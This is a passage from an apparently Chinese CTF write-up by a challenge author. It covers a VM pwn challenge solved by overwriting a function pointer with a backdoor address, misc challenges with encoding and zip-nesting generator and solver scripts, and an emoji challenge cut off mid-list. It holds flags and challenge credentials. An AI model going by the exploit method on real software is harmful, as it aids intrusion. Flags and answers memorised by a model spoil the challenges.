href="https://www.cnblogs.com/pengdonglin137/p/3345911.html">https://www.cnblogs.com/pengdonglin137/p/3345911.html</a></p><p>看到va，printf或者scanf系列的没跑了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cwejlwyj30u00vqtdx.jpg" alt=""></p><p>不管是用程序的逻辑试还是逆向都很容易确定出来前四个case分别是加减乘除</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cyytjt3j617i0kk78d02.jpg" alt=""></p><p>case 0x48实现了pop操作，case 0x40实现了push操作，可以向栈上写入任意数据，通过pop可以控制我们自己实现的寄存器reg，并且case38可以实现向任意位置写入寄存器reg的操作，通过这一套操作实现了一个任意地址写</p><p>流程：push 后门函数地址，pop弹栈，pop弹栈（此时寄存器被赋值为后门的地址），利用任意地址写写到函数指针，退出执行getshell</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d0ev2asj60v207ujsh02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d1kiasaj619o0k4tec02.jpg" alt=""></p><p>函数指针就在模拟的栈空间的上方，算下偏移很容易算出来是负8</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d3bty13j615g0o4wk602.jpg" alt=""></p><p>通过查看字符串可以找到后门</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bbbbbbaaaaaasssssseeeeee"><a href="#bbbbbbaaaaaasssssseeeeee" class="headerlink" title="bbbbbbaaaaaasssssseeeeee"></a>bbbbbbaaaaaasssssseeeeee</h3><p>给了文本文件，一眼过去base编码，base解完发现是套了不同的base，写个脚本循环解密完事</p><p>出题脚本如下，我用的随机数，我也不知道啥套了啥，暴力破解就完了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlag</span>(<span class="params">i, flag</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">        flag = base64.b16encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>):</span><br><span class="line">        flag = base64.b32encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">        flag = base64.b64encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">3</span>):</span><br><span class="line">        flag = base64.b85encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;Bas3_1s_s0_b3autifu1!&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    flag = encodeFlag(random.randint(<span class="number">0</span>, <span class="number">3</span>), flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag.encode())</span><br></pre></td></tr></table></figure><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b16decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b64decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    text = base64.b85decode(text).decode()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4i8cfafqj60ca03st8z02.jpg" alt=""></p><h3 id="zzzzzziiiiiipppppp"><a href="#zzzzzziiiiiipppppp" class="headerlink" title="zzzzzziiiiiipppppp"></a>zzzzzziiiiiipppppp</h3><p>flag{D0nt_h1t_m3_N0_m0r3_01d_tr1ck5!}</p><p>灵感来源于ctf生涯中及其短暂的时间内任职过一个misc手而打过的比赛中的无脑套娃题——【MRCTF】千层套路，本题又降低了难度，因为当时解出来好像</p><p>给了压缩包，稍微试试就知道密码是文件名，但是压缩包很多，手解不可能，于是只能搓jio本</p><p>稍微查查就知道python有个库叫zipfile可以解，但是很慢，所以会写shell jio本的同学应该更容易抢到一血，但是👴🏻不会shell jio本所以👴🏻注定抢不了一血，因为👴🏻是出题人，跑偏了</p><p>现给出出题用的jio 本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compressedFileToCreate</span>(<span class="params">random_number, prev_filename</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;prev:&#x27;</span> + prev_filename)</span><br><span class="line">    filename = <span class="built_in">str</span>(random_number) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    os.system(<span class="string">&quot;zip -P %s %s %s&quot;</span>%(<span class="built_in">str</span>(random_number), filename, prev_filename))</span><br><span class="line">    <span class="keyword">if</span> prev_filename[-<span class="number">4</span>:] == <span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomNumberGeneration</span>():</span></span><br><span class="line">    number = string.digits</span><br><span class="line">    random_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        index = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">        random_list.append(number[index])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        number = randomNumberGeneration()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, <span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, prev_filename)</span><br></pre></td></tr></table></figure><p>解题脚本很简单，就是得等一会儿，等到报错的时候，就还有一个文件没有解开，手动解就完了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">filename, prev_filename</span>):</span></span><br><span class="line">    fz = zipfile.ZipFile(filename + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=<span class="built_in">bytes</span>(filename, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> prev_filename:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename + <span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">    fz.close()</span><br><span class="line">    <span class="keyword">return</span> filename,name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;8366&#x27;</span><span class="comment"># 初始压缩包文件名</span></span><br><span class="line">    prev_filename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prev_filename,filename = exp(filename, prev_filename)</span><br></pre></td></tr></table></figure><h3 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h3><p>出题思路：图片盲水印，foremost 然后用盲水印脚本一把梭</p><p>flag{water_mark_is_so_fun}</p><h3 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h3><p>附件给了一个pdf</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5q8fuo9aj61ec0rewjh02.jpg" alt=""></p><p>注意到后面有个nc地址，连上去发现需要输入username和password，但是不知道，pdf中有username和password，虽然挡住了，但是能够直接复制出来，得到username和password分别为lemon和l3m0n_l0v3_rgb，然后nc连上去输入用户名和密码</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qpl745kj614g0d2mzg02.jpg" alt=""></p><p>获得一个网址，我们用web端访问一下看看</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qtajoe8j60qk0jgq4i02.jpg" alt=""></p><p>有个文本文件，下载下来康康</p><p>部分内容：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qttlz10j60d00ii0tz02.jpg" alt=""></p><p>结合刚才的密码，这个应该是个rgb图像的像素点，并且还给了宽和高，利用PIL库合成像素点获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">2012</span></span><br><span class="line">y = <span class="number">1014</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># 记得删掉前两行的宽和高方便数据处理</span></span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">        <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">            line = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">            rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qvelkd1j61dl0u00w002.jpg" alt=""></p><p>flag{l3m0n_10v3_pdf_and_rgb}</p><h3 id="emoji-master"><a href="#emoji-master" class="headerlink" title="emoji-master"></a>emoji-master</h3><h4 id="出题人视角"><a href="#出题人视角" class="headerlink" title="出题人视角"></a>出题人视角</h4><p>👴🏻就是抽象，所以就有了这个题，致敬抽象文学</p><p>现翻了翻emojicode就挺有意思，本来可以放字符串的，但是没有节目效果，所以改成了emoji编码，但是有hint，问题不大</p><p>emoji随机生成脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emoji</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">emoji_list = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">:bowtie:</span></span><br><span class="line"><span class="string">:smile:</span></span><br><span class="line"><span class="string">:simple_smile:</span></span><br><span class="line"><span class="string">:laughing:</span></span><br><span class="line"><span class="string">:blush:</span></span><br><span class="line"><span class="string">:smiley:</span></span><br><span class="line"><span class="string">:relaxed:</span></span><br><span class="line"><span class="string">:smirk:</span></span><br><span class="line"><span class="string">:heart_eyes:</span></span><br><span class="line"><span class="string">:kissing_heart:</span></span><br><span class="line"><span class="string">:kissing_closed_eyes:</span></span><br><span class="line"><span class="string">:flushed:</span></span><br><span class="line"><span class="string">:relieved:</span></span><br><span class="line"><span class="string">:satisfied:</span></span><br><span class="line"><span class="string">:grin:</span></span><br><span class="line"><span class="string">:wink:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_winking_eye:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_closed_eyes:</span></span><br><span class="line"><span class="string">:grinning:</span></span><br><span class="line"><span class="string">:kissing:</span></span><br><span class="line"><span class="string">:kissing_smiling_eyes:</span></span><br><span class="line"><span class="string">:stuck_out_tongue:</span></span><br><span class="line"><span class="string">:sleeping:</span></span><br><span class="line"><span class="string">:worried:</span></span><br><span class="line"><span class="string">:frowning:</span></span><br><span class="line"><span class="string">:anguished:</span></span><br><span class="line"><span class="string">:open_mouth:</span></span><br><span class="line"><span class="string">:grimacing:</span></span><br><span class="line"><span class="string">:confused:</span></span><br><span class="line"><span class="string">:hushed:</span></span><br><span class="line"><span class="string">:expressionless:</span></span><br><span class="line"><span class="string">:unamused:</span></span><br><span class="line"><span class="string">:sweat_smile:</span></span><br><span class="line"><span class="string">:sweat:</span></span><br><span class="line"><span class="string">:disappointed_relieved:</span></span><br><span class="line"><span class="string">:weary:</span></span><br><span class="line"><span class="string">:pensive:</span></span><br><span class="line"><span class="string">:disappointed:</span></span><br><span class="line"><span class="string">:confounded:</span></span><br><span class="line"><span class="string">:fearful:</span></span><br><span class="line"><span class="string">:cold_sweat:</span></span><br><span class="line"><span class="string">:persevere:</span></span><br><span class="line"><span class="string">:cry:</span></span><br><span class="line"><span class="string">:sob:</span></span><br><span class="line"><span class="string">:joy:</span></span><br><span class="line"><span class="string">:astonished:</span></span><br><span class="line"><span class="string">:scream:</span></span><br><span class="line"><span class="string">:neckbeard:</span></span><br><span class="line"><span class="string">:tired_face:</span></span><br><span class="line"><span class="string">:angry:</span></span><br><span class="line"><span class="string">:rage:</span></span><br><span class="line"><span class="string">:triumph:</span></span><br><span class="line"><span class="string">:sleepy:</span></span><br><span class="line"><span class="string">:yum:</span></span><br><span class="line"><span class="string">:mask:</span></span><br><span class="line"><span class="string">:sunglasses:</span></span><br><span class="line"><span class="string">:dizzy_face:</span></span><br><span class="line"><span class="string">:imp:</span></span><br><span class="line"><span class="string">:smiling_imp:</span></span><br><span class="line"><span class="string">:neutral_face:</span></span><br><span class="line"><span class="string">:no_mouth:</span></span><br><span class="line"><span class="string">:innocent:</span></span><br><span class="line"><span class="string">:alien:</span></span><br><span class="line"><span class="string">:yellow_heart:</span></span><br><span class="line"><span class="string">:blue_heart:</span></span><br><span class="line"><span class="string">:purple_heart:</span></span><br><span class="line"><span class="string">:heart:</span></span><br><span class="line"><span class="string">:green_heart:</span></span><br><span class="line"><span class="string">:broken_heart:</span></span><br><span class="line"><span class="string">:heartbeat:</span></span><br><span class="line"><span class="string">:heartpulse:</span></span><br><span class="line"><span class="string">:two_hearts:</span></span><br><span class="line"><span class="string">:revolving_hearts:</span></span><br><span class="line"><span class="string">:cupid:</span></span><br><span class="line"><span class="string">:sparkling_heart:</span></span><br><span class="line"><span class="string">:sparkles:</span></span><br><span class="line"><span class="string">:star:</span></span><br><span class="line"><span class="string">:star2:</span></span><br><span class="line"><span class="string">:dizzy:</span></span><br><span class="line"><span class="string">:boom:</span></span><br><span class="line"><span class="string">:collision:</span></span><br><span class="line"><span class="string">:anger:</span></span><br><span class="line"><span class="string">:exclamation:</span></span><br><span class="line"><span class="string">:question:</span></span><br><span class="line"><span class="string">:grey_exclamation:</span></span><br><span class="line"><span class="string">:grey_question:</span></span><br><span class="line"><span class="string">:zzz:</span></span><br><span class="line"><span class="string">:dash:</span></span><br><span class="line"><span class="string">:sweat_drops:</span></span><br><span class="line"><span class="string">:notes:</span></span><br><span class="line"><span class="string">:musical_note:</span></span><br><span class="line"><span class="string">:fire:</span></span><br><span class="line"><span class="string">:hankey:</span></span><br><span class="line"><span class="string">:poop:</span></span><br><span class="line"><span class="string">:shit:</span></span><br><span class="line"><span class="string">:+1:</span></span><br><span class="line"><span class="string">:thumbsup:</span></span><br><span class="line"><span class="string">:-1:</span></span><br><span class="line"><span class="string">:thumbsdown:</span></span><br><span class="line"><span class="string">:ok_hand:</span></span><br><span class="line"><span class="string">:punch:</span></span><br><span class="line"><span class="string">:facepunch:</span></span><br><span class="line"><span class="string">:fist:</span></span><br><span class="line"><span class="string">:v:</span></span><br><span class="line"><span class="string">:wave:</span></span><br><span class="line"><span class="string">:hand:</span></span><br><span class="line"><span class="string">:raised_hand:</span></span><br><span class="line"><span class="string">:open_hands:</span></span><br><span class="line"><span class="string">:point_up:</span></span><br><span class="line"><span class="string">:point_down:</span></span><br><span class="line"><span class="string">:point_left:</span></span><br><span class="line"><span class="string">:point_right:</span></span><br><span class="line"><span class="string">:raised_hands:</span></span><br><span class="line"><span class="string">:pray:</span></span><br><span class="line"><span class="string">:point_up_2:</span></span><br><span class="line"><span class="string">:clap:</span></span><br><span class="line"><span class="string">:muscle:</span></span><br><span class="line"><span class="string">:metal:</span></span><br><span class="line"><span class="string">:fu:</span></span><br><span class="line"><span class="string">:runner:</span></span><br><span class="line"><span class="string">:running:</span></span><br><span class="line"><span class="string">:couple:</span></span><br><span class="line"><span class="string">:family:</span></span><br><span class="line"><span class="string">:two_men_holding_hands:</span></span><br><span class="line"><span class="string">:two_women_holding_hands:</span></span><br><span class="line"><span class="string">:dancer:</span></span><br><span class="line"><span class="string">:dancers:</span></span><br><span class="line"><span class="string">:ok_woman:</span></span><br><span class="line"><span class="string">:no_good:</span></span><br><span class="line"><span class="string">:information_desk_person:</span></span><br><span class="line"><span class="string">:raising_hand:</span></span><br><span class="line"><span class="string">:bride_with_veil:</span></span><br><span class="line"><span class="string">:person_with_pouting_face:</span></span><br><span class="line"><span class="string">:person_frowning:</span></span><br><span class="line"><span class="string">:bow:</span></span><br><span class="line"><span class="string">:couplekiss:</span></span><br><span class="line"><span class="string">:couple_with_heart:</span></span><br><span class="line"><span class="string">:massage:</span></span><br><span class="line"><span class="string">:haircut:</span></span><br><span class="line"><span class="string">:nail_care:</span></span><br><span class="line"><span class="string">:boy:</span></span><br><span class="line"><span class="string">:girl:</span></span><br><span class="line"><span class="string">:woman:</span></span><br><span class="line"><span class="string">:man:</span></span><br><span class="line"><span class="string">:baby:</span></span><br><span class="line"><span class="string">:older_woman:</span></span><br><span class="line"><span class="string">:older_man:</span></span><br><span class="line"><span class="string">:person_with_blond_hair:</span></span><br><span class="line"><span class="string">:man_with_gua_pi_mao:</span></span><br><span class="line"><span class="string">:man_with_turban:</span></span><br><span class="line"><span class="string">:construction_worker:</span></span><br><span class="line"><span class="string">:cop:</span></span><br><span class="line"><span class="string">:angel:</span></span><br><span class="line"><span class="string">:princess:</span></span><br><span class="line"><span class="string">:smiley_cat:</span></span><br><span class="line"><span class="string">:smile_cat:</span></span><br><span class="line"><span class="string">:heart_eyes_cat:</span></span><br><span class="line"><span class="string">:kissing_cat:</span></span><br><span class="line"><span class="string">:smirk_cat:</span></span><br><span class="line"><span class="string">:scream_cat:</span></span><br><span class="line"><span class="string">:crying_cat_face:</span></span><br><span class="line"><span class="string">:joy_cat:</span></span><br><span class="line"><span class="string">:pouting_cat:</span></span><br><span class="line"><span class="string">:japanese_ogre:</span></span><br><span class="line"><span class="string">:japanese_goblin:</span></span><br><span class="line"><span class="string">:see_no_evil:</span></span><br><span class="line"><span class="string">:hear_no_evil:</span></span><br><span class="line"><span class="string">:speak_no_evil:</span></span><br><span class="line"><span class="string">:guardsman:</span></span><br><span class="line"><span class="string">:skull:</span></span><br><span class="line"><span class="string">:feet:</span></span><br><span class="line"><span class="string">:lips:</span></span><br><span class="line"><span class="string">:kiss:</span></span><br><span class="line"><span class="string">:droplet:</span></span><br><span class="line"><span class="string">:ear:</span></span><br><span class="line"><span class="string">:eyes:</span></span><br><span class="line"><span class="string">:nose:</span></span><br><span class="line"><span class="string">:tongue:</span></span><br><span class="line"><span class="string">:love_letter:</span></span><br><span class="line"><span class="string">:bust_in_silhouette:</span></span><br><span class="line"><span class="string">:busts_in_silhouette:</span></span><br><span class="line"><span class="string">:speech_balloon:</span></span><br><span class="line"><span class="string">:thought_balloon:</span></span><br><span class="line"><span class="string">:feelsgood:</span></span><br><span class="line"><span class="string">:finnadie:</span></span><br><span class="line"><span class="string">:goberserk:</span></span><br><span class="line"><span class="string">:godmode:</span></span><br><span class="line"><span class="string">:hurtrealbad:</span></span><br><span class="line"><span class="string">:rage1:</span></span><br><span class="line"><span class="string">:rage2:</span></span><br><span class="line"><span class="string">:rage3:</span></span><br><span class="line"><span class="string">:rage4:</span></span><br><span class="line"><span class="string">:suspect:</span></span><br><span class="line"><span class="string">:trollface:</span></span><br><span class="line"><span class="string">:sunny:</span></span><br><span class="line"><span class="string">:umbrella:</span></span><br><span class="line"><span class="string">:cloud:</span></span><br><span class="line"><span class="string">:snowflake:</span></span><br><span class="line"><span class="string">:snowman:</span></span><br><span class="line"><span class="string">:zap:</span></span><br><span class="line"><span class="string">:cyclone:</span></span><br><span class="line"><span class="string">:foggy:</span></span><br><span class="line"><span class="string">:ocean:</span></span><br><span class="line"><span class="string">:cat:</span></span><br><span class="line"><span class="string">:dog:</span></span><br><span class="line"><span class="string">:mouse:</span></span><br><span class="line"><span class="string">:hamster:</span></span><br><span class="line"><span class="string">:rabbit:</span></span><br><span class="line"><span class="string">:wolf:</span></span><br><span class="line"><span class="string">:frog:</span></span><br><span class="line"><span class="string">:tiger:</span></span><br><span class="line"><span class="string">:koala:</span></span><br><span class="line"><span class="string">:bear:</span></span><br><span class="line"><span class="string">:pig:</span></span><br><span class="line"><span class="string">:pig_nose:</span></span><br><span class="line"><span class="string">:cow:</span></span><br><span class="line"><span class="string">:boar:</span></span><br><span class="line"><span class="string">:monkey_face:</span></span><br><span class="line"><span class="string">:monkey:</span></span><br><span class="line"><span class="string">:horse:</span></span><br><span class="line"><span class="string">:racehorse:</span></span><br><span class="line"><span class="string">:camel:</span></span><br><span class="line"><span class="string">:sheep:</span></span><br><span class="line"><span class="string">:elephant:</span></span><br><span class="line"><span class="string">:panda_face:</span></span><br><span class="line"><span class="string">:snake:</span></span><br><span class="line"><span class="string">:bird:</span></span><br><span class="line"><span class="string">:baby_chick:</span></span><br><span class="line"><span class="string">:hatched_chick:</span></span><br><span class="line"><span class="string">:hatching_chick:</span></span><br><span class="line"><span class="string">:chicken:</span></span><br><span class="line"><span class="string">:penguin:</span></span><br><span class="line"><span class="string">:turtle:</span></span><br><span class="line"><span class="string">:bug:</span></span><br><span class="line"><span class="string">:honeybee:</span></span><br><span class="line"><span class="string">:ant:</span></span><br><span class="line"><span class="string">:beetle:</span></span><br><span class="line"><span class="string">:snail:</span></span><br><span class="line"><span class="string">:octopus:</span></span><br><span class="line"><span class="string">:tropical_fish:</span></span><br><span class="line"><span class="string">:fish:</span></span><br><span class="line"><span class="string">:whale:</span></span><br><span class="line"><span class="string">:whale2:</span></span><br><span class="line"><span class="string">:dolphin:</span></span><br><span class="line"><span class="string">:cow2:</span></span><br><span class="line"><span class="string">:ram:</span></span><br><span class="line"><span class="string">:rat:</span></span><br><span class="line"><span class="string">:water_buffalo:</span></span><br><span class="line"><span class="string">:tiger2:</span></span><br><span class="line"><span class="string">:rabbit2:</span></span><br><span class="line"><span class="string">:dragon:</span></span><br><span class="line"><span class="string">:goat:</span></span><br><span class="line"><span class="string">:rooster:</span></span><br><span class="line"><span class="string">:dog2:</span></span><br><span class="line"><span class="string">:pig2:</span></span><br><span class="line"><span class="string">:mouse2:</span></span><br><span class="line"><span class="string">:ox:</span></span><br><span class="line"><span class="string">:dragon_face:</span></span><br><span class="line"><span class="string">:blowfish:</span></span><br><span class="line"><span class="string">:crocodile:</span></span><br><span class="line"><span class="string">:dromedary_camel:</span></span><br><span class="line"><span class="string">:leopard:</span></span><br><span class="line"><span class="string">:cat2:</span></span><br><span class="line"><span class="string">:poodle:</span></span><br><span class="line"><span class="string">:paw_prints:</span></span><br><span class="line"><span class="string">:bouquet:</span></span><br><span class="line"><span class="string">:cherry_blossom:</span></span><br><span class="line"><span class="string">:tulip:</span></span><br><span class="line"><span class="string">:four_leaf_clover:</span></span><br><span class="line"><span class="string">:rose:</span></span><br><span class="line"><span class="string">:sunflower:</span></span><br><span class="line"><span class="string">:hibiscus:</span></span><br><span class="line"><span class="string">:maple_leaf:</span></span><br><span class="line"><span class="string">:leaves:</span></span><br><span class="line"><span class="string">:fallen_leaf:</span></span><br><span class="line"><span class="string">:herb:</span></span><br><span class="line"><span class="string">:mushroom:</span></span><br><span class="line"><span class="string">:cactus:</span></span><br><span class="line"><span class="string">:palm_tree:</span></span><br><span class="line"><span class="string">:evergreen_tree:</span></span><br><span class="line"><span class="string">:deciduous_tree:</span></span><br><span class="line"><span class="string">:chestnut:</span></span><br><span class="line"><span class="string">:seedling:</span></span><br><span class="line"><span class="string">:blossom:</span></span><br><span class="line"><span class="string">:ear_of_rice:</span></span><br><span class="line"><span class="string">:shell:</span></span><br><span class="line"><span class="string">:globe_with_meridians:</span></span><br><span class="line"><span class="string">:sun_with_face:</span></span><br><span class="line"><span class="string">:full_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon:</span></span><br><span class="line"><span class="string">:waxing_crescent_moon:</span></span><br><span class="line"><span class="string">:first_quarter_moon:</span></span><br><span class="line"><span class="string">:waxing_gibbous_moon:</span></span><br><span class="line"><span class="string">:full_moon:</span></span><br><span class="line"><span class="string">:waning_gibbous_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon:</span></span><br><span class="line"><span class="string">:waning_crescent_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:first_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:crescent_moon:</span></span><br><span class="line"><span class="string">:earth_africa:</span></span><br><span class="line"><span class="string">:earth_americas:</span></span><br><span class="line"><span class="string">:earth_asia:</span></span><br><span class="line"><span class="string">:volcano:</span></span><br><span class="line"><span class="string">:milky_way:</span></span><br><span class="line"><span class="string">:partly_sunny:</span></span><br><span class="line"><span class="string">:octocat:</span></span><br><span class="line"><span class="string">:squirrel:</span></span><br><span class="line"><span class="string">:bamboo:</span></span><br><span class="line"><span class="string">:gift_heart:</span></span><br><span class="line"><span class="string">:dolls:</span></span><br><span class="line"><span class="string">:school_satchel:</span></span><br><span class="line"><span class="string">:mortar_board:</span></span><br><span class="line"><span class="string">:flags:</span></span><br><span class="line"><span class="string">:fireworks:</span></span><br><span class="line"><span class="string">:sparkler:</span></span><br><span class="line"><span class="string">:wind_chime:</span></span><br><span class="line"><span class="string">:rice_scene:</span></span><br><span class="line"><span class="string">:jack_o_lantern:</span></span><br><span class="line"><span class="string">:ghost:</span></span><br><span class="line"><span class="string">:santa:</span></span><br><span class="line"><span class="string">:christmas_tree:</span></span><br><span class="line"><span class="string">:gift:</span></span><br><span class="line"><span class="string">:bell:</span></span><br><span class="line"><span class="string">:no_bell:</span></span><br><span class="line"><span class="string">:tanabata_tree:</span></span><br><span class="line"><span class="string">:tada:</span></span><br><span class="line"><span class="string">:confetti_ball:</span></span><br><span class="line"><span class="string">:balloon:</span></span><br><span class="line"><span class="string">:crystal_ball:</span></span><br><span class="line"><span class="string">:cd:</span></span><br><span class="line"><span class="string">:dvd:</span></span><br><span class="line"><span class="string">:floppy_disk:</span></span><br><span class="line"><span class="string">:camera:</span></span><br><span class="line"><span class="string">:video_camera:</span></span><br><span class="line"><span class="string">:movie_camera:</span></span><br><span class="line"><span class="string">:computer:</span></span><br><span class="line"><span class="string">:tv:</span></span><br><span class="line"><span class="string">:iphone:</span></span><br><span class="line"><span class="string">:phone:</span></span><br><span class="line"><span class="string">:telephone:</span></span><br><span class="line"><span class="string">:telephone_receiver:</span></span><br><span class="line"><span class="string">:pager:</span></span><br><span class="line"><span class="string">:fax:</span></span><br><span class="line"><span class="string">:minidisc:</span></span><br><span class="line"><span class="string">:vhs:</span></span><br><span class="line"><span class="string">:sound:</span></span><br><span class="line"><span class="string">:speaker:</span></span><br><span class="line"><span class="string">:mute:</span></span><br><span class="line"><span class="string">:loudspeaker:</span></span><br><span class="line"><span class="string">:mega:</span></span><br><span class="line"><span class="string">:hourglass:</span></span><br><span class="line"><span class="string">:hourglass_flowing_sand:</span></span><br><span class="line"><span class="string">:alarm_clock:</span></span><br><span class="line"><span class="string">:watch:</span></span><br><span class="line"><span class="string">:radio:</span></span><br><span class="line"><span class="string">:satellite:</span></span><br><span class="line"><span class="string">:loop:</span></span><br><span class="line"><span class="string">:mag:</span></span><br><span class="line"><span class="string">:mag_right:</span></span><br><span class="line"><span class="string">:unlock:</span></span><br><span class="line"><span class="string">:lock:</span></span><br><span class="line"><span class="string">:lock_with_ink_pen:</span></span><br><span class="line"><span class="string">:closed_lock_with_key:</span></span><br><span class="line"><span 